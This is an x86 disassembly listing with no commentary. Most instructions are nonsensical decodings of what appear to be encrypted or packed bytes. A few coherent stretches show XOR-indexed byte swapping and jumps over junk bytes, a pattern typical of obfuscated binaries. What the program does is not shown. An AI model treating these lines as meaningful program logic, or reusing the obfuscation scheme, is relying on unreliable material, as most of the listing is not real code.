  40c7ef:	cmp    al,0xf8
  40c7f1:	sar    BYTE PTR [ebx-0x59],0xb2
  40c7f5:	jg     0x40c81a
  40c7f7:	push   ebx
  40c7f8:	cmp    eax,0xc6433656
  40c7fd:	mov    esp,0x3dfa9a3b
  40c802:	sbb    eax,0x4cc2c97b
  40c807:	nop
  40c808:	xlat   BYTE PTR ds:[ebx]
  40c809:	lods   al,BYTE PTR ds:[esi]
  40c80a:	mov    ds:0x3cee5b95,eax
  40c80f:	xor    eax,DWORD PTR ds:0x4589adee
  40c815:	sbb    edi,0xc7f7a13b
  40c81b:	ja     0x40c842
  40c81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81e:	jge    0x40c7da
  40c820:	sub    eax,0x4d557391
  40c825:	inc    eax
  40c826:	pop    ss
  40c827:	jbe    0x40c7d5
  40c829:	in     eax,0xc5
  40c82b:	and    edx,DWORD PTR [ebx]
  40c82d:	xchg   BYTE PTR es:[ecx+eax*2],bh
  40c831:	arpl   WORD PTR ds:0x5c51095c,ax
  40c837:	xor    eax,0x842a55b
  40c83c:	dec    eax
  40c83d:	fdiv   st(7),st
  40c83f:	bound  eax,QWORD PTR [edx]
  40c841:	add    DWORD PTR [edx+0x423c56c7],esp
  40c847:	int3   
  40c848:	into   
  40c849:	xor    DWORD PTR [eax+0x50b91f70],edi
  40c84f:	or     ebp,DWORD PTR [ebx]
  40c851:	loopne 0x40c80d
  40c853:	repz aad 0x86
  40c856:	mov    es,WORD PTR cs:[edi]
  40c859:	mov    edx,0x3cb0f222
  40c85e:	(bad)  
  40c85f:	xlat   BYTE PTR ds:[ebx]
  40c860:	faddp  st(3),st
  40c862:	xchg   edi,eax
  40c863:	lds    esp,FWORD PTR [edi+0x5c4b0fec]
  40c869:	aam    0xdc
  40c86b:	push   ebx
  40c86c:	test   al,0x37
  40c86e:	add    ecx,DWORD PTR ds:0xadb59387
  40c874:	and    al,0xdc
  40c876:	or     ah,BYTE PTR [ecx-0x51]
  40c879:	or     ah,BYTE PTR [eax-0x3916073a]
  40c87f:	add    DWORD PTR [ebp-0x744de6cf],eax
  40c885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c886:	mov    ds,eax
  40c888:	xchg   DWORD PTR [ebp-0x6bf86a87],edi
  40c88e:	cld    
  40c88f:	in     eax,dx
  40c890:	dec    esi
  40c891:	push   es
  40c892:	shl    BYTE PTR [ecx+ebx*4+0x4d32ff19],0x7b
  40c89a:	pushf  
  40c89b:	div    DWORD PTR [ebp-0x3b75777d]
  40c8a1:	dec    ebp
  40c8a2:	jae    0x40c82b
  40c8a4:	sbb    al,0x6d
  40c8a6:	retf   
  40c8a7:	jecxz  0x40c8f6
  40c8a9:	ret    0x1f0d
  40c8ac:	test   eax,0x99616aa3
  40c8b1:	mov    al,0xf4
  40c8b3:	or     DWORD PTR [edx-0x2c],esi
  40c8b6:	aas    
  40c8b7:	sbb    DWORD PTR [edi+0x53d031aa],ebx
  40c8bd:	mov    eax,ds:0xc775b42
  40c8c2:	mov    ebx,0x26dfabc8
  40c8c7:	push   0xc12da7e4
  40c8cc:	mov    dl,0x8f
  40c8ce:	nop
  40c8cf:	jg     0x40c8af
  40c8d1:	jg     0x40c917
  40c8d3:	ret    
  40c8d4:	sub    BYTE PTR [ebx],ch
  40c8d6:	leave  
  40c8d7:	adc    DWORD PTR [edx],eax
  40c8d9:	xchg   bh,ch
  40c8db:	jecxz  0x40c8e3
  40c8dd:	test   DWORD PTR [edi+ebp*8-0x34c7564f],ecx
  40c8e4:	cmp    eax,ebp
  40c8e6:	out    dx,al
  40c8e7:	fistp  QWORD PTR [eax]
  40c8e9:	add    bl,bl
  40c8eb:	inc    ebx
  40c8ec:	(bad)  
  40c8ed:	ret    0xb4d9
  40c8f0:	stc    
  40c8f1:	cmp    BYTE PTR [edx+0x65],ah
  40c8f4:	pop    esi
  40c8f5:	cdq    
  40c8f6:	jmp    0x40c8f3
  40c8f8:	fisttp DWORD PTR ds:0x705c7b21
  40c8fe:	mov    bh,0x85
  40c900:	fs int 0x95
  40c903:	test   eax,0x5596523d
  40c908:	fsub   DWORD PTR gs:[edi+0x4c621813]
  40c90f:	push   es
  40c910:	out    0x65,al
  40c912:	test   BYTE PTR [esi+eax*2-0x4d],ah
  40c916:	cwde   
  40c917:	push   eax
  40c918:	jnp    0x40c939
  40c91a:	xor    dh,ah
  40c91c:	jmp    0x2adf:0xa218869
  40c923:	inc    edx
  40c924:	add    BYTE PTR [esi],bh
  40c926:	hlt    
  40c927:	adc    BYTE PTR [esi-0x37ac2927],ch
  40c92d:	jo     0x40c8c8
  40c92f:	and    dh,0x3c
  40c932:	js     0x40c8e4
  40c934:	mov    ah,al
  40c936:	push   ebp
  40c937:	arpl   WORD PTR [edx-0x53],dx
  40c93a:	add    bl,al
  40c93c:	or     eax,0x2a28e05e
  40c941:	cmp    eax,0x395d220
  40c946:	push   ebp
  40c947:	in     al,dx
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	pandn  mm2,QWORD PTR [edi+0x10]
  40c9a1:	xchg   ebx,eax
  40c9a2:	retf   0x7e92
  40c9a5:	jle    0x40ca17
  40c9a7:	jns    0x40ca27
  40c9a9:	jle    0x40ca00
  40c9ab:	push   0xe51f268e
  40c9b0:	pop    ecx
  40c9b1:	orps   xmm3,XMMWORD PTR [ecx]
  40c9b4:	fadd   DWORD PTR [esi+0x1ce058c0]
  40c9ba:	xchg   edi,eax
  40c9bb:	adc    BYTE PTR [ebx+0x41],dh
  40c9be:	fcmovnb st,st(7)
  40c9c0:	inc    ebp
  40c9c1:	adc    DWORD PTR [ebx+0x3550b0f3],0x9ed845da
  40c9cb:	jp     0x40ca05
  40c9cd:	jb     0x40c9b2
  40c9cf:	jmp    0x8398:0xc9734665
  40c9d6:	cmp    al,0xf0
  40c9d8:	into   
  40c9d9:	pop    ss
  40c9da:	loope  0x40c9d1
  40c9dc:	xor    eax,0x69e2d28
  40c9e1:	and    BYTE PTR [edx+ebx*2+0x17],cl
  40c9e5:	test   bh,dh
  40c9e7:	jl     0x40c99f
  40c9e9:	ins    DWORD PTR es:[edi],dx
  40c9ea:	cld    
  40c9eb:	loopne 0x40c9dd
  40c9ed:	loope  0x40c9ea
  40c9ef:	jb     0x40ca00
  40c9f1:	sub    cl,BYTE PTR es:[ebx+0x46]
  40c9f5:	popf   
  40c9f6:	cdq    
  40c9f7:	cmc    
  40c9f8:	jge    0x40ca48
  40c9fa:	int3   
  40c9fb:	mov    ebx,0x57e49b75
  40ca00:	nop
  40ca01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca02:	adc    edi,ebp
  40ca04:	das    
  40ca05:	ja     0x40ca77
  40ca07:	sub    dh,dl
  40ca09:	jge    0x40c9b0
  40ca0b:	fidivr WORD PTR [ebp+0x322915bc]
  40ca11:	push   ss
  40ca12:	dec    ecx
  40ca13:	inc    ebx
  40ca14:	loopne 0x40c9f8
  40ca16:	popf   
  40ca17:	outs   dx,DWORD PTR ds:[esi]
  40ca18:	inc    esi
  40ca19:	mov    ds:0x2b1cc935,al
  40ca1e:	clc    
  40ca1f:	sbb    al,0x8e
  40ca21:	jg     0x40c9e3
  40ca23:	pop    ecx
  40ca24:	sbb    edi,DWORD PTR [ebx-0x39fc34f]
  40ca2a:	mov    ebp,0x69ac595e
  40ca2f:	pop    ds
  40ca30:	lds    eax,FWORD PTR [ebp+ebp*8-0x1e0252b3]
  40ca37:	inc    edi
  40ca38:	cmp    eax,0x6ceb5d6f
  40ca3d:	inc    BYTE PTR [ecx]
  40ca3f:	or     esp,DWORD PTR [esi]
  40ca41:	cs sub al,0xbf
  40ca44:	popa   
  40ca45:	aas    
  40ca46:	mov    dl,BYTE PTR [ebp-0x4e026636]
  40ca4c:	xchg   edi,eax
  40ca4d:	and    BYTE PTR [edx-0x2a],dl
  40ca50:	ficom  DWORD PTR [ecx+edi*4]
  40ca53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca54:	cli    
  40ca55:	pop    edi
  40ca56:	add    BYTE PTR [edx-0x33962ac6],dl
  40ca5c:	rol    DWORD PTR [esi+eax*1-0xf],1
  40ca60:	pop    esp
  40ca61:	pop    ebx
  40ca62:	pushf  
  40ca63:	and    BYTE PTR [edx-0x22],bl
  40ca66:	inc    esi
  40ca67:	push   0xb5ce8319
  40ca6c:	or     ebx,DWORD PTR [edi+0x6b9e0c38]
  40ca72:	js     0x40caf0
  40ca74:	sub    eax,0xe26c5aae
  40ca79:	jmp    0x4091c58c
  40ca7e:	push   edi
  40ca7f:	cdq    
  40ca80:	(bad)  
  40ca82:	(bad)  
  40ca83:	fisubr DWORD PTR [ecx]
  40ca85:	out    0xb1,eax
  40ca87:	mov    esp,DWORD PTR [esi-0x3fb32144]
  40ca8d:	das    
  40ca8e:	jmp    0x40caac
  40ca90:	push   esi
  40ca91:	mov    al,ds:0x56a8e5a1
  40ca96:	xchg   BYTE PTR ds:[esi-0x67],ch
  40ca9a:	adc    eax,0xb462615e
  40ca9f:	iret   
  40caa0:	ins    DWORD PTR es:[edi],dx
  40caa1:	dec    ebp
  40caa2:	adc    esi,DWORD PTR [ebx-0xe]
  40caa5:	xor    eax,0x97349c4a
  40caaa:	mov    ecx,0xf7d33dab
  40caaf:	and    al,0xc5
  40cab1:	ret    0xf12d
  40cab4:	fstp   TBYTE PTR [ecx-0x4e616d2a]
  40caba:	retf   0x532
  40cabd:	lock fcmovbe st,st(5)
  40cac0:	cwde   
  40cac1:	or     DWORD PTR [eax+edx*1-0x23b7e286],ebp
  40cac8:	mov    esi,0xe06c38c5
  40cacd:	ror    DWORD PTR ds:0x9f9f6720,1
  40cad3:	out    dx,al
  40cad4:	mov    eax,0x20ffb956
  40cad9:	leave  
  40cada:	aam    0x4c
  40cadc:	dec    ebx
  40cadd:	mov    cl,0x6a
  40cadf:	ja     0x40cb48
  40cae1:	pop    esi
  40cae2:	dec    esp
  40cae3:	jb     0x40cb5f
  40cae5:	sub    BYTE PTR [ebx+0x37c0824b],0x37
  40caec:	sar    BYTE PTR [ebx-0x901996d],0x6c
  40caf3:	add    esi,DWORD PTR [edx+ecx*2]
  40caf6:	pop    ds
  40caf7:	adc    DWORD PTR ds:[ecx+ebx*2+0x45],edi
  40cafc:	sbb    eax,0xdea3bf98
  40cb01:	loope  0x40cacf
  40cb03:	test   al,0x64
  40cb05:	xor    BYTE PTR [eax+esi*4],bh
  40cb08:	add    bh,ah
  40cb0a:	lock push 0x85cf2dfb
  40cb10:	addr16 push ebx
  40cb12:	and    DWORD PTR [edx],0xffffff86
  40cb15:	fisub  DWORD PTR [esi+0x571bab96]
  40cb1b:	rcr    DWORD PTR [esi],cl
  40cb1d:	stc    
  40cb1e:	inc    esp
  40cb1f:	imul   ecx,DWORD PTR [eax],0x55
  40cb22:	fs cmp al,bh
  40cb25:	lods   al,BYTE PTR ds:[esi]
  40cb26:	call   0x4d37:0xc524293
  40cb2d:	jns    0x40cb18
  40cb2f:	fbld   TBYTE PTR [edx+0x575e8a5b]
  40cb35:	or     eax,0x5531a5c
  40cb3a:	cmp    al,dl
  40cb3c:	int3   
  40cb3d:	popa   
  40cb3e:	inc    esp
  40cb3f:	fisubr DWORD PTR [ebx+0x50]
  40cb42:	inc    eax
  40cb43:	scas   eax,DWORD PTR es:[edi]
  40cb44:	sub    eax,DWORD PTR [ecx-0x70e0fbe3]
  40cb4a:	push   0xffffffd3
  40cb4c:	jb     0x40caec
  40cb4e:	pop    ds
  40cb4f:	dec    esp
  40cb50:	inc    edx
  40cb51:	jge    0x40cb83
  40cb53:	mov    esp,0x7bcde30d
  40cb58:	sub    al,0x95
  40cb5a:	mov    DWORD PTR [edi-0x3aa7379b],ecx
  40cb60:	xchg   ecx,eax
  40cb61:	jne    0x40cb62
  40cb63:	arpl   WORD PTR [eax+0x56],sp
  40cb66:	fprem  
  40cb68:	ins    BYTE PTR es:[edi],dx
  40cb69:	fdivr  QWORD PTR [edi+ebx*2-0x6ef55b16]
  40cb70:	fucom  st(6)
  40cb72:	cs xchg esi,eax
  40cb74:	inc    edi
  40cb75:	and    cl,BYTE PTR [edi-0x1d0d4759]
  40cb7b:	(bad)  
  40cb7c:	ja     0x40cb5a
  40cb7e:	neg    ch
  40cb80:	add    BYTE PTR [ebx-0x6ebf2d31],bl
  40cb86:	repz retf 
  40cb88:	pop    esi
  40cb89:	or     bl,BYTE PTR [ebx]
  40cb8b:	dec    ebx
  40cb8c:	ret    
  40cb8d:	mov    bl,ch
  40cb8f:	inc    esp
  40cb90:	sub    BYTE PTR [edi],bh
  40cb92:	nop
  40cb93:	pop    eax
  40cb94:	xor    BYTE PTR [esi-0x3f],bh
  40cb97:	push   esp
  40cb98:	aas    
  40cb99:	dec    edx
  40cb9a:	jns    0x40cbc4
  40cb9c:	adc    BYTE PTR [edi],ah
  40cb9e:	xchg   ecx,eax
  40cb9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cba0:	sar    DWORD PTR [edx],0x8d
  40cba3:	or     DWORD PTR [esi+0x2eb7fbb4],ecx
  40cba9:	mov    ebx,ss
  40cbab:	imul   ecx,DWORD PTR [ecx+edx*2-0xffdf8e6],0xffffffab
  40cbb3:	pop    es
  40cbb4:	fild   WORD PTR [edx+edx*2+0x31e0e201]
  40cbbb:	mov    DWORD PTR gs:[eax+0x627ef242],edx
  40cbc2:	adc    dl,BYTE PTR ds:0x1b5ccb54
  40cbc8:	push   0xc03a0cfa
  40cbcd:	lods   al,BYTE PTR ds:[esi]
  40cbce:	mov    es,WORD PTR [ebp+0x23]
  40cbd1:	lahf   
  40cbd2:	and    eax,0x9b2bb4e6
  40cbd7:	das    
  40cbd8:	adc    eax,0xbdefc6f0
  40cbdd:	in     eax,dx
  40cbde:	ins    BYTE PTR es:[edi],dx
  40cbdf:	outs   dx,BYTE PTR ds:[esi]
  40cbe0:	push   ecx
  40cbe1:	data16 shr dl,1
  40cbe4:	cmp    DWORD PTR ds:0x34129bd3,edx
  40cbea:	xor    eax,0x71a7b02f
  40cbef:	(bad)  
  40cbf0:	fnstcw WORD PTR [eax+0x3f]
  40cbf3:	ret    0x79f8
  40cbf6:	loopne 0x40cc70
  40cbf8:	repz cmp edx,eax
  40cbfb:	push   ecx
  40cbfc:	fisttp WORD PTR [edi]
  40cbfe:	jno    0x40cc7b
  40cc00:	xchg   ecx,eax
  40cc01:	xchg   edi,eax
  40cc02:	mov    eax,0x1bc0b1b9
  40cc07:	int    0xa
  40cc09:	js     0x40cc06
  40cc0b:	lds    ebp,FWORD PTR [eax-0x33]
  40cc0e:	into   
  40cc0f:	push   ebx
  40cc10:	adc    al,0x54
  40cc12:	dec    eax
  40cc13:	out    0x90,al
  40cc15:	xor    al,0x92
  40cc17:	repnz and edi,edi
  40cc1a:	jns    0x40cbbc
  40cc1c:	mov    ch,0xce
  40cc1e:	in     al,0x5
  40cc20:	nop
  40cc21:	pop    esi
  40cc22:	add    al,0x95
  40cc24:	jne    0x40cc58
  40cc26:	sub    BYTE PTR [edi+0x1d64b2db],ch
  40cc2c:	rcl    BYTE PTR [ebx+0x5d],cl
  40cc2f:	sub    esi,DWORD PTR [eax+0x441efd59]
  40cc35:	std    
  40cc36:	adc    eax,0x946e5b6d
  40cc3b:	cmp    dl,al
  40cc3d:	dec    edi
  40cc3e:	sub    edx,DWORD PTR [ebx+esi*8+0x4ec57b22]
  40cc45:	(bad)  
  40cc46:	jmp    0x26e98b13
  40cc4b:	push   ebp
  40cc4c:	bound  esi,QWORD PTR [eax-0x4b]
  40cc4f:	mov    ch,BYTE PTR [ebp-0x2]
  40cc52:	xchg   DWORD PTR [edi],edi
  40cc54:	xlat   BYTE PTR ds:[ebx]
  40cc55:	mov    ebx,0x3bb4f371
  40cc5a:	lahf   
  40cc5b:	dec    esi
  40cc5c:	or     bh,BYTE PTR [edi+0x2addb39d]
  40cc62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc63:	pop    DWORD PTR [edi]
  40cc65:	xchg   edx,eax
  40cc66:	iret   
  40cc67:	pop    edi
  40cc68:	lds    esi,FWORD PTR [ebp+0x18]
  40cc6b:	xor    DWORD PTR [edi],0x67
  40cc6e:	mov    eax,ds:0x5fd75d88
  40cc73:	loopne 0x40cc12
  40cc75:	jns    0x40cc37
  40cc77:	cmp    ecx,ecx
  40cc79:	mov    edi,0x1388f8fb
  40cc7e:	and    edi,DWORD PTR [edi+ebp*4-0xa]
  40cc82:	retf   
  40cc83:	mov    edi,0x2b78f7f3
  40cc88:	in     eax,0xa3
  40cc8a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40cc8c:	retf   
  40cc8d:	rcr    BYTE PTR [edx+ecx*2+0x1227170d],cl
  40cc94:	mov    dl,0xfa
  40cc96:	adc    BYTE PTR [ebx],0xf3
  40cc99:	(bad)  
  40cc9c:	dec    esi
  40cc9d:	pop    ecx
  40cc9e:	dec    edi
  40cc9f:	sub    al,0x67
  40cca1:	inc    esi
  40cca2:	out    dx,eax
  40cca3:	jecxz  0x40cc58
  40cca5:	shr    ebx,1
  40cca7:	xor    dl,BYTE PTR [ebp+0x3a0e6b35]
  40ccad:	jmp    0x56e766f3
  40ccb2:	xor    al,0xb
  40ccb4:	retf   
  40ccb5:	aaa    
  40ccb6:	retf   
  40ccb7:	jmp    0x40cc9d
  40ccb9:	int3   
  40ccba:	mov    WORD PTR [ebx],?
  40ccbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccbd:	cs lock mov cl,0x3
  40ccc1:	inc    edx
  40ccc2:	xchg   DWORD PTR [ebp-0x64ff3448],edi
  40ccc8:	cs mov cl,0x22
  40cccb:	cli    
  40cccc:	push   ds
  40cccd:	mov    bl,0xc9
  40cccf:	push   eax
  40ccd0:	and    al,0x48
  40ccd2:	push   ecx
  40ccd3:	(bad)  [ebx]
  40ccd5:	mov    dh,BYTE PTR [ebx+0x22]
  40ccd8:	lahf   
  40ccd9:	xlat   BYTE PTR ds:[ebx]
  40ccda:	or     DWORD PTR [ebx-0x56ff5530],esi
  40cce0:	sbb    edx,DWORD PTR [eax+0x1dc1a515]
  40cce6:	xor    al,0xb5
  40cce8:	sub    ah,BYTE PTR [ecx+edi*1+0x33]
  40ccec:	arpl   WORD PTR [ecx+0x498fb21b],bx
  40ccf2:	scas   eax,DWORD PTR es:[edi]
  40ccf3:	adc    DWORD PTR [edx-0x27],ebp
  40ccf6:	out    0xf,eax
  40ccf8:	xchg   edi,eax
  40ccf9:	ret    
  40ccfa:	adc    esi,edx
  40ccfc:	das    
  40ccfd:	mov    cl,0x42
  40ccff:	xchg   edi,eax
  40cd00:	pop    eax
  40cd01:	in     eax,dx
  40cd02:	in     al,0xf8
  40cd04:	dec    ebx
  40cd05:	fld    QWORD PTR [ebx+0x1d8d92ff]
  40cd0b:	test   BYTE PTR [esi-0x48],ch
  40cd0e:	sbb    eax,0x9a612f45
  40cd13:	dec    ecx
  40cd14:	mov    ch,0x73
  40cd16:	ror    DWORD PTR [ecx+0x1],1
  40cd19:	push   esi
  40cd1a:	cmp    ch,bl
  40cd1c:	stos   BYTE PTR es:[edi],al
  40cd1d:	sahf   
  40cd1e:	push   esi
  40cd1f:	sub    DWORD PTR [eax+0x6d8f9dc3],edi
  40cd25:	int3   
  40cd26:	(bad)  
  40cd27:	scas   al,BYTE PTR es:[edi]
  40cd28:	fs jl  0x40cd1c
  40cd2b:	daa    
  40cd2c:	mov    fs,WORD PTR [ebx+0x970052c]
  40cd32:	pushf  
  40cd33:	adc    bh,ch
  40cd35:	xor    eax,0x4e47fe0f
  40cd3a:	ins    BYTE PTR es:[edi],dx
  40cd3b:	pop    edi
  40cd3c:	xchg   esi,eax
  40cd3d:	push   0xfffffffc
  40cd3f:	push   ebp
  40cd40:	mov    ebp,ds
  40cd42:	loopne 0x40ccfd
  40cd44:	loop   0x40cd12
  40cd46:	cmc    
  40cd47:	or     cl,bl
  40cd49:	and    BYTE PTR [edx],ah
  40cd4b:	in     al,0x5e
  40cd4d:	or     DWORD PTR [edx],ecx
  40cd4f:	stc    
  40cd50:	in     al,0x40
  40cd52:	in     al,0xd9
  40cd54:	and    dl,bl
  40cd56:	lahf   
  40cd57:	std    
  40cd58:	cmp    BYTE PTR [edx],dl
  40cd5a:	xchg   edi,eax
  40cd5b:	iret   
  40cd5c:	cmp    al,0x87
  40cd5e:	xchg   esi,eax
  40cd5f:	and    BYTE PTR [esi+esi*4],cl
  40cd62:	sti    
  40cd63:	cmp    bh,bh
  40cd65:	(bad)  [ebx+esi*8]
  40cd68:	sahf   
  40cd69:	loope  0x40cd8f
  40cd6b:	and    BYTE PTR [eax-0x14],al
  40cd6e:	pop    ebp
  40cd6f:	std    
  40cd70:	xchg   edi,eax
  40cd71:	adc    DWORD PTR [ecx],edx
  40cd73:	daa    
  40cd74:	shl    bh,1
  40cd76:	mov    al,ds:0xa8f94406
  40cd7b:	xchg   edi,eax
  40cd7c:	imul   ebp,DWORD PTR [ecx-0x69],0x50
  40cd80:	ror    BYTE PTR [ecx+ecx*4-0x58],0xbd
  40cd85:	and    eax,0x5907abb
  40cd8a:	arpl   WORD PTR [ecx+0x74de1114],si
  40cd90:	mov    dh,0x3
  40cd92:	(bad)  
  40cd93:	pop    edi
  40cd94:	inc    ecx
  40cd95:	xor    ah,BYTE PTR ds:0xfb23e139
  40cd9b:	lahf   
  40cd9c:	xor    DWORD PTR [ebx-0x65c19e83],0x94886291
  40cda6:	pop    ds
  40cda7:	cdq    
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	std    
  40cdda:	dec    ebx
  40cddb:	bound  esp,QWORD PTR [edi+0x7e7e9ecc]
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	dec    esi
  40cde6:	dec    edi
  40cde7:	mov    bh,0xea
  40cde9:	aas    
  40cdea:	push   eax
  40cdeb:	cwde   
  40cdec:	adc    ebp,esp
  40cdee:	mov    ah,0x3
  40cdf0:	test   eax,0xac0d18a0
  40cdf5:	sbb    cl,BYTE PTR [eax+0x67f6b4e7]
  40cdfb:	fmul   QWORD PTR [eax-0x2da7fb47]
  40ce01:	inc    esi
  40ce02:	(bad)
  40ce05:	lea    ecx,[esi+0x74d176e0]
  40ce0b:	aad    0xa1
  40ce0d:	mov    bl,0xa
  40ce0f:	sar    BYTE PTR [ecx+0x15],1
  40ce12:	call   0x7aa4:0xa97ba2df
  40ce19:	in     eax,0x7c
  40ce1b:	test   al,0x5c
  40ce1d:	dec    esi
  40ce1e:	mov    edx,0x73a6cb47
  40ce23:	pop    esi
  40ce24:	dec    edi
  40ce25:	test   BYTE PTR [edx],ah
  40ce27:	int    0xe8
  40ce29:	mov    WORD PTR [ebx+0x42d88c2f],fs
  40ce2f:	mov    dh,0x97
  40ce31:	aas    
  40ce32:	(bad)  
  40ce33:	mov    edi,0xfe5b389a
  40ce38:	idiv   DWORD PTR [edx-0x2e2f2451]
  40ce3e:	or     edx,ebp
  40ce40:	cmp    DWORD PTR [esi],edx
  40ce42:	add    eax,0x536e124d
  40ce47:	je     0x40ce75
  40ce49:	pop    ecx
  40ce4a:	test   DWORD PTR [ecx],esi
  40ce4c:	clc    
  40ce4d:	(bad)  
  40ce4f:	adc    BYTE PTR [ecx+0x60],al
  40ce52:	leave  
  40ce53:	mov    ch,0x31
  40ce55:	sbb    edi,esp
  40ce57:	cwde   
  40ce58:	retf   
  40ce59:	sub    ch,BYTE PTR [edi+0x726ba3ff]
  40ce5f:	outs   dx,BYTE PTR ds:[esi]
  40ce60:	and    eax,0x892e21d8
  40ce65:	leave  
  40ce66:	(bad)
  40ce69:	into   
  40ce6a:	inc    ecx
  40ce6b:	sub    DWORD PTR [ebx-0x34],edx
  40ce6e:	inc    ebp
  40ce6f:	popf   
  40ce70:	int    0xc8
  40ce72:	jne    0x40ce7f
  40ce74:	mov    eax,ds:0x8f034db1
  40ce79:	jmp    0x45656a92
  40ce7e:	rol    DWORD PTR [ecx],1
  40ce80:	outs   dx,BYTE PTR ds:[esi]
  40ce81:	bound  ebx,QWORD PTR [ecx-0x77]
  40ce84:	aad    0xb
  40ce86:	add    eax,0xf603f0d8
  40ce8b:	or     eax,esi
  40ce8d:	jl     0x40ce10
  40ce8f:	rol    BYTE PTR [esi],0xb2
  40ce92:	sub    DWORD PTR ds:0xa8d3d531,ecx
  40ce98:	int    0x66
  40ce9a:	sbb    BYTE PTR [ecx+0x7455469b],al
  40cea0:	das    
  40cea1:	not    BYTE PTR ds:0x11ad3baf
  40cea7:	in     eax,0x99
  40cea9:	jecxz  0x40cf00
  40ceab:	call   0xeeffd553
  40ceb0:	imul   esp,DWORD PTR [eiz*2-0x31d2c1ad],0x2f002571
  40cebb:	jmp    FWORD PTR [edi]
  40cebd:	cwde   
  40cebe:	xlat   BYTE PTR ds:[ebx]
  40cebf:	and    al,0xa9
  40cec1:	ss stos DWORD PTR es:[edi],eax
  40cec3:	cmc    
  40cec4:	jae    0x40ce6b
  40cec6:	and    BYTE PTR [ebp+0x4b],dl
  40cec9:	sbb    BYTE PTR [eax-0x3a2e212],0xba
  40ced0:	inc    esp
  40ced1:	mov    dh,0x80
  40ced3:	push   ds
  40ced4:	addr16 mov dh,0xb9
  40ced7:	dec    ebx
  40ced8:	sub    eax,0xb09bdbe7
  40cedd:	stos   BYTE PTR es:[edi],al
  40cede:	xor    ch,ch
  40cee0:	fidiv  WORD PTR [eax+0x6b39790d]
  40cee6:	pop    edx
  40cee7:	xor    ah,BYTE PTR [edx+0x48]
  40ceea:	xor    al,0xd4
  40ceec:	jnp    0x40cec4
  40ceee:	scas   al,BYTE PTR es:[edi]
  40ceef:	cmp    ax,0x3616
  40cef3:	in     eax,0xd8
  40cef5:	xchg   ecx,eax
  40cef6:	dec    ebp
  40cef7:	jp     0x40cede
  40cef9:	fimul  WORD PTR [edx+ecx*8-0x7]
  40cefd:	fidiv  WORD PTR [edx]
  40ceff:	or     eax,0x50a9dfcc
  40cf04:	shr    al,cl
  40cf06:	xor    edi,DWORD PTR [eax+0x78f32774]
  40cf0c:	retf   0xcf2
  40cf0f:	and    DWORD PTR [edx-0x3],0xffffff97
  40cf13:	outs   dx,DWORD PTR ds:[esi]
  40cf14:	test   DWORD PTR [esi],eax
  40cf16:	pop    es
  40cf17:	sbb    BYTE PTR [ecx+0x39],cl
  40cf1a:	repz or al,0xc4
  40cf1d:	or     al,0xe
  40cf1f:	mov    ebp,0x82c0685e
  40cf24:	je     0x40cf74
  40cf26:	push   es
  40cf27:	pop    eax
  40cf28:	or     eax,DWORD PTR [eax+ecx*4]
  40cf2b:	inc    ebx
  40cf2c:	mov    cl,0xd9
  40cf2e:	(bad)  
  40cf2f:	ins    BYTE PTR es:[edi],dx
  40cf30:	or     DWORD PTR [edx+ebp*2],0xfffffff6
  40cf34:	or     cl,BYTE PTR [edi]
  40cf36:	idiv   dl
  40cf38:	dec    edi
  40cf39:	ficomp DWORD PTR [ecx-0x76]
  40cf3c:	pop    ebx
  40cf3d:	mov    esi,0x13f68b3a
  40cf42:	test   al,0x4e
  40cf44:	xor    esi,0x53
  40cf47:	jne    0x40cfb1
  40cf49:	or     edx,DWORD PTR [edx+ebx*2-0x4f1794bf]
  40cf50:	jnp    0x40cf89
  40cf52:	xchg   DWORD PTR [esi+0x415a712b],edi
  40cf58:	fist   DWORD PTR [ebx-0x7abe0f36]
  40cf5e:	pusha  
  40cf5f:	cli    
  40cf60:	imul   ebx,DWORD PTR [edi+0x2dc948b0],0x3a85d3c4
  40cf6a:	inc    ecx
